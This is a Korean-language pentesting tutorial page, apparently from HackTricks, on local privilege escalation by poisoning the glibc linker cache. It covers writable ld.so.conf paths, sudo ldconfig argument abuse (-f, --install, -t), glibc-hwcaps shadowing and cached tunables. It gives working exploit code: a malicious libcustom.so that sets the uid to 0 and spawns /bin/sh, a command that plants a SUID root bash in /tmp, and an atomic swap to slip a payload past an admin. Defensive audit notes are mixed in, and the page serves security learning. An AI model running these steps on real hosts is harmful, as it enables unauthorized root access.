# ld.so 권한 상승 exploit 예제

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 **`/etc/ld.so.conf` 또는 `ldconfig`를 통한 system linker cache poisoning**에 초점을 맞춘 lab입니다. missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` 및 기타 일반적인 SUID linker abuse에 대해서는 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)를 참조하세요.

## 환경 준비

다음 섹션에서는 환경을 준비하는 데 사용할 파일의 code를 확인할 수 있습니다.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 동일한 폴더에 해당 파일들을 **생성**합니다.
2. **library**를 **컴파일**합니다: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`에 **복사**하고 cache를 새로 고칩니다: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root 권한)
4. **executable**을 **컴파일**합니다: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 환경 확인

_libcustom.so_가 _/usr/lib_에서 **로드**되고 binary를 **실행**할 수 있는지 확인합니다.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 유용한 triage 명령어

실제 target을 공격할 때는 binary가 필요로 하는 **정확한 library 이름**, loader가 **현재 resolving 중인 대상**, 그리고 live cache를 변경하지 않고 writable한 configured path를 확인하세요.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
신뢰할 수 있는 실행 파일에만 `ldd`를 사용하세요. 일부 구현이나 비정상적인 ELF interpreter는 attacker-controlled code를 실행할 수 있으므로, `objdump -p ./file | grep NEEDED`를 사용하면 direct dependencies를 안전하게 나열할 수 있습니다. 신뢰할 수 있는 대상이라면, 확인된 interpreter를 `--list`와 함께 실행하여 실제 resolution을 확인할 수 있습니다. 해당 출력과 `--inhibit-cache --list`의 출력을 비교했을 때 차이가 있다면, 일반적인 search-path 규칙이 아니라 `/etc/ld.so.cache`가 해당 object를 선택했다는 뜻입니다.<sup>[[1]](#references)[[4]](#references)</sup>

다음과 같은 유용한 주의 사항이 있습니다:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf`는 일반적으로 **작동하지 않습니다**. redirection은 현재 shell이 수행하기 때문입니다. 대신
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`를 사용하세요.
- **SUID/privileged** binary는 **secure-execution mode**로 실행됩니다. `LD_LIBRARY_PATH`는 무시되고, `LD_PRELOAD`는 제한됩니다(슬래시가 포함된 이름은 무시되며, standard directories에 있는 setuid-marked libraries만 preload할 수 있습니다). 이후 root가 `ldconfig`를 실행하면 `/etc/ld.so.conf`에 지정된 directories가 `/etc/ld.so.cache`에 들어갈 수 있으므로, 이 misconfiguration은 여전히 privileged programs에 영향을 줄 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` 역시 `/etc/suid-debug`가 존재하지 않는 한 secure-execution mode에서 무시됩니다. 따라서 privileged execution에서 출력이 나올 것으로 기대하지 말고, 동등한 non-SUID 실행에서 trace를 수집하세요.<sup>[[1]](#references)</sup>
- glibc 2.33 이상에서는 dynamic loader가 `--list-diagnostics`도 제공합니다. hijack이 예상대로 동작하지 않을 때 machine-readable loader diagnostics와 built-in search-path 정보를 출력합니다.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache 및 SONAME 제약 조건

`ldconfig`는 configured directory에 있는 모든 임의의 파일을 cache하지 않습니다. ELF headers를 검사하고 `lib*.so*` 또는 `ld-*.so*`와 일치하는 이름을 인식하며, 일반적인 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain을 요구합니다. 따라서 injected object에는 target architecture/class, 정확한 `DT_NEEDED` name(일반적으로 해당 object의 `DT_SONAME`), 그리고 victim이 resolve하는 모든 symbols/versions가 있어야 합니다.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
이 예제와 같이 target-specific library를 사용하는 것이 좋습니다. 불완전한 object로 일반적인 SONAME을 shadowing하면, 의도한 privileged target이 실행되기 전에 해당 SONAME을 resolve하는 모든 process가 중단될 수 있습니다.<sup>[[3]](#references)</sup>

### Cached-path persistence and atomic swaps

cache에는 **library name to pathname** 매핑이 기록되며, shared object 자체가 포함되지는 않습니다. 공격자가 제어하는 pathname이 cache에 저장된 후에는, 정확히 해당 path의 object를 교체하면 추가 `ldconfig` 실행 없이 새로 시작되는 process에 영향을 줄 수 있습니다. 이를 통해 유용한 time-of-check/time-of-use 패턴을 구현할 수 있습니다. 관리자의 cache rebuild 또는 inspection 중에는 유효한 library를 노출한 다음, payload를 해당 위치에 atomic rename합니다. 기존 process는 이미 매핑된 object를 계속 사용합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
마찬가지로 `ld.so.conf`에서 malicious line을 삭제해도 이미 기록된 entry가 그 자체로 제거되지는 않습니다. 관리자는 untrusted object를 제거하고, 소유권/write access를 수정한 다음 cache를 다시 빌드해야 합니다. 위의 `--inhibit-cache` 비교를 사용하여 stale cache entry와 여전히 활성 상태인 configuration path를 구분하세요.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

이 시나리오에서는 관리자가 시스템의
`/etc/ld.so.conf`에 포함되는 `/etc/ld.so.conf.d/` 아래 파일에 vulnerable entry를 추가했다고 가정합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
취약한 폴더는 쓰기 권한이 있는 _/home/ubuntu/lib_입니다.\
해당 경로 안에서 다음 코드를 **다운로드하고 컴파일**하세요:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
나중에 **root**(또는 다른 권한 있는 계정)가 취약한 바이너리를 실행할 것으로 예상된다면, 대화형 셸을 생성하는 대신 **root-owned artifact**를 남겨 두는 것이 일반적으로 더 좋습니다. 예를 들면:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
그런 다음 privileged execution이 발생하면 `/tmp/rootbash -p`를 사용할 수 있습니다.

이제 **misconfigured** path 내부에 malicious libcustom library를 **created**했으므로, successful privileged **`ldconfig`** 실행을 통해 default cache를 다시 빌드해야 합니다. reboot은 로컬 boot process가 실제로 이를 호출하는 경우에만 도움이 됩니다. 그렇지 않으면 administrator action을 기다리거나, 사용 가능한 경우 unsafe sudo rule을 사용하세요.<sup>[[2]](#references)</sup>

이 작업이 완료되면 `sharedvuln` executable이 `libcustom.so` library를 어디에서 load하는지 **recheck**하세요:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
보시다시피 이는 **`/home/ubuntu/lib`에서 로드**되며, 어떤 사용자가 이를 실행하면 셸이 실행됩니다:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 이 예제에서는 아직 권한을 상승시키지 않았습니다. 하지만 실행되는 명령을 수정하고 **root 또는 다른 권한 있는 사용자가 취약한 binary를 실행할 때까지 기다리면** 권한을 상승시킬 수 있습니다.

### 최신 `glibc-hwcaps` shadowing

glibc 2.33부터 loader는 **모든 library search directory** 내부의 `glibc-hwcaps/<level>/` 아래에 있는 최적화된 library를 우선 사용할 수 있습니다. 따라서 `/home/ubuntu/lib`만 확인하는 것은 충분하지 않습니다. `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`와 같이 쓰기가 가능한 호환 subdirectory가 `ldconfig`에 의해 index되면 base library를 shadowing할 수 있으며, 다른 CPU에서는 계속 base object가 사용됩니다. 또한 이는 다른 CPU에서 validation이 수행될 때 놓칠 수 있는 architecture-selective hijack을 제공합니다.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
현재 glibc hardening guidance에서는 중복된 SONAME, non-default search location, 그리고 `glibc-hwcaps` 하위 디렉터리에 있는 object를 피할 것을 권장합니다. Audit 관점에서는 설정된 디렉터리와 해당 디렉터리의 parent path component에 대해 ownership 및 writeability checks를 재귀적으로 적용해야 합니다.<sup>[[3]](#references)</sup>

### 기타 misconfiguration - 동일한 vuln

이전 예제에서는 administrator가 **`/etc/ld.so.conf.d/` 내 configuration file에 non-privileged folder를 설정한** misconfiguration을 위조했습니다.\
하지만 동일한 vulnerability를 유발할 수 있는 다른 misconfiguration도 있습니다. 로드된 **config file**에 대한 **write permission**이 있거나, writeable한 `/etc/ld.so.conf.d/` 디렉터리에 file을 생성할 수 있거나, `/etc/ld.so.conf`에 write할 수 있다면 동일한 vulnerability를 configure하고 exploit할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig`에 대한 sudo privilege가 있다고 가정해 봅시다**. `ldconfig`는 scan directory를 positional argument로 허용하므로, 가장 짧은 cache-poisoning 형태는 대개 간단히 다음과 같습니다:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
또는 `-f`는 기본 캐시 출력을 유지하면서 다른 구성 파일을 선택합니다. 이는 인자 필터가 위치 인자를 통한 디렉터리 지정을 차단하지만 `-f`는 허용하는 경우 또는 여러 경로를 주입해야 하는 경우에 유용합니다:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
이제 **이전 exploit**에서 설명한 것처럼 **`/tmp` 내부에 악성 라이브러리를 생성**합니다.\
마지막으로 경로를 로드하고 binary가 라이브러리를 어디에서 로드하는지 확인합니다:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**보시다시피 `ldconfig`에 대한 sudo 권한이 있으면 동일한 vulnerability를 exploit할 수 있습니다.** 제한된 sudo rule을 평가할 때는 option 세부 사항이 중요합니다. `-f`는 다른 configuration을 선택하지만 여전히 `/etc/ld.so.cache`를 다시 빌드합니다. `-C`는 cache를 다른 위치로 redirect합니다. `-N`은 cache 재빌드를 방지합니다. `-X`는 link 업데이트를 방지하지만 **`-N`과 함께 사용하지 않는 한 여전히 cache를 다시 빌드합니다**. `-n`은 `-N`을 의미하므로 지정된 directory의 link는 업데이트할 수 있지만 cache를 poison할 수는 없습니다. `-r`은 alternate root 아래에서 동작하며 일반적으로 host cache를 변경하지 않습니다.<sup>[[2]](#references)</sup>

### glibc 2.44: 미리 빌드된 cache 설치

Glibc 2.44에는 미리 빌드된 cache를 선택한 cache destination으로 원자적으로 복사하는 `ldconfig --install SOURCE`가 추가되었습니다(`-C` 또는 `-r`이 변경하지 않는 한 host의 `/etc/ld.so.cache`). 이로 인해 sudoers rule과 privileged wrapper에 또 다른 위험한 argument가 생깁니다. attacker는 **권한 없이** 유효한 cache를 구성한 다음, 허용된 `--install` invocation을 사용해 system cache를 교체할 수 있습니다. install path는 cache magic을 확인하지만 trusted configuration에서 entry를 다시 생성하지는 않습니다.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
캐시에는 여전히 **library bytes**가 아니라 **pathnames**가 포함되므로, victim이 시작될 때 `/tmp/libcustom.so`가 존재하고 호환 가능한 상태로 남아 있어야 합니다. 따라서 단순히 `-f`, positional directories 또는 `-t`를 거부하는 filters는 glibc 2.44에서 불완전합니다. `--install`/`-I`도 거부하거나, 가능하면 `ldconfig`에 위임하지 않아야 합니다.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached system-wide tunables

glibc 2.44부터 `ldconfig`는 `/etc/tunables.conf`도 parse하고 해당 settings를 `/etc/ld.so.cache`의 extension으로 저장합니다. 이 file은 `include` directives와 per-process filters를 허용합니다. Prefixes가 scope를 제어합니다. `@`/`onlysecure`는 `AT_SECURE` processes만 대상으로 하고, `$`/`nonsecure`는 해당 processes를 제외하며, `*`/`anysecure`는 둘 다 대상으로 합니다. **Prefix가 없는 entry는 기본적으로 non-secure processes에 적용되므로**, attacker가 setuid, setgid 또는 capability-elevated programs에 영향을 주려면 명시적으로 `@` 또는 `*`를 사용해야 합니다. 이로 인해 audit boundary가 library directories를 넘어 확장됩니다. writable tunables configuration 또는 포함된 file은 privileged cache rebuild 이후 향후 program startups에 영향을 줄 수 있습니다.<sup>[[7]](#references)[[9]](#references)</sup>

동일한 release에는 `ldconfig -t TUNCONF`도 추가되었습니다. 이 option은 alternate tunables file을 선택하면서도 다른 option이 변경하지 않는 한 normal cache에 계속 기록합니다. 따라서 `-f`만 차단하려 했던 wrappers와 sudo rules는 `-t`, arbitrary positional directories, `--install` 및 cache-output manipulation도 거부해야 합니다.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### 대상 선택적 tunables

`[proc:PATTERN]` 필터는 실행 파일의 전체 `/proc/self/exe` 경로(`PATTERN`이 `/`로 시작하는 경우) 또는 basename이 일치할 때만 다음 항목을 적용합니다. 필터는 다음 필터, `[]`, 파일의 끝 또는 include-file 경계에서 종료됩니다. 이를 통해 변경된 동작을 하나의 권한 있는 victim으로 제한할 수 있으므로, poisoned cache로 인해 발생하는 noise를 줄일 수 있습니다.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
`-`/`nonoverridable` 접두사는 `GLIBC_TUNABLES`가 캐시된 값을 재정의하지 못하도록 하며, `+`/`overridable`은 일반적인 재정의 동작을 복원합니다. `AT_SECURE` 프로세스에서는 어차피 환경 변수가 완전히 무시됩니다. 파일 형식은 버전별로 다르게 취급해야 합니다. glibc 프로젝트는 이를 안정적인 인터페이스로 보장하지 않으며, 특정 효과를 시도하기 전에 `"$interp" --list-tunables`로 지원되는 이름과 값을 열거하십시오.<sup>[[7]](#references)[[9]](#references)</sup>

이는 자동으로 임의 코드 실행으로 이어지는 것이 아닙니다. 이는 권한이 있는 **loader-behavior manipulation** primitive입니다. glibc는 시스템 전역 값이 개별 tunable에 대한 보안 심사 없이 setuid/setgid 프로그램에 보안에 민감한 tunable을 적용할 수 있다고 명시적으로 경고합니다. 보편적인 payload를 가정하기보다는 대상별 allocator 변경, CPU hardening 변경 또는 denial-of-service 조건을 확인하십시오.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [GNU C Library 버전 2.44 출시](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
